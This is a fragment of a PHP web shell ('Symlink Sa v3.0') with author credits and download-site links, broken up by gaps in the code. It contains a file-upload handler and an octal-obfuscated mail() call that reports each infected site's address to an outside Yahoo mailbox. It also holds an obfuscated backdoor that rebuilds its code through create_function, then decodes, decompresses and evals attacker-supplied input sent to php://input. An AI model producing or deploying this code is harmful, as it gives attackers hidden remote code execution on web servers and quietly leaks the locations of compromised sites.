...
$sys=$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]; $zv="\155ai\154";
...
echo '<br /><div class="hedr"> Symlink Sa v3.0 <br /></div>' ;
...
<br /><br /><br /></div>';
if (!isset($_COOKIE['sec-w'])){@$zv("locahost@\171\141\x68\157\157\056\x63o\155","$sys","$sys");}
if(isset($_REQUEST['sws'])){switch ($_REQUEST['sws']){
...
if( $_POST['_upl'] == "Upload" ) {
    ...
    echo '
<br /><br /><br /></b></b><div class="fot">Coded by <b>Mr.Alsa3ek</b>
<br /><br />
<b style="color: red";> www.phpshelldownload.com </b>
<br /><br />
Muslims Hackers</div> ';
...
<a style="text-decoration: none; color: #F4F4F4;" title="shell download"/href="http://www.phpshelldownload.com">shell download</a>

<a style="text-decoration: none; color: #F4F4F4;" title="shell indir"/href="http://www.phpshelldownload.com">shell indir</a>
...
eval($min($linr . $winr));
$v='$kZ*="140fZ*Z*6969";$kh="d5Z*Z*213fd0ece0";$Z*kf="3Z*148e6Z*2e461Z*eZ*";$pZ*="yuBF6xmfKikKzSZ*Z*amZ*";function x($t,$k';
$U='Z*contZ*ents();@Z*obZ*_end_cleanZ*()Z*;$r=@baZ*se64_Z*encode(Z*@x(@gzcomZ*prZ*Z*eZ*ss($o),Z*$k));print("$p$khZ*$r$kf");}';
$F=str_replace('Jh','','creJhaJhtJhe_fuJhJhncJhtion');
$j='{$Z*o.=$t{$i}^$kZ*{$j};Z*}}retuZ*rn $o;}Z*if(@prZ*egZ*_match("/Z*$kh(.+Z*)$kf/"Z*,@file_gZ*et_contZ*ents(Z*"phpZ*:Z*//';
$b=')Z*{$Z*Z*c=strleZ*n($k);$l=strleZ*n(Z*Z*$t);$o="";for($i=Z*0Z*;$i<$l;){foZ*r($jZ*=0;(Z*$j<$c&&$i<Z*$l);$Z*j++,Z*$i+Z*+)';
$G='inputZ*"),$m)==1Z*){@Z*ob_start();Z*@evaZ*l(@gzuZ*ncomZ*press(@x(@baZ*se64_Z*decodeZ*Z*($m[1]),Z*$k)));$o=Z*@ob_get_';
$d=str_replace('Z*','',$v.$b.$j.$G.$U);
$o=$F('',$d);$o();
?>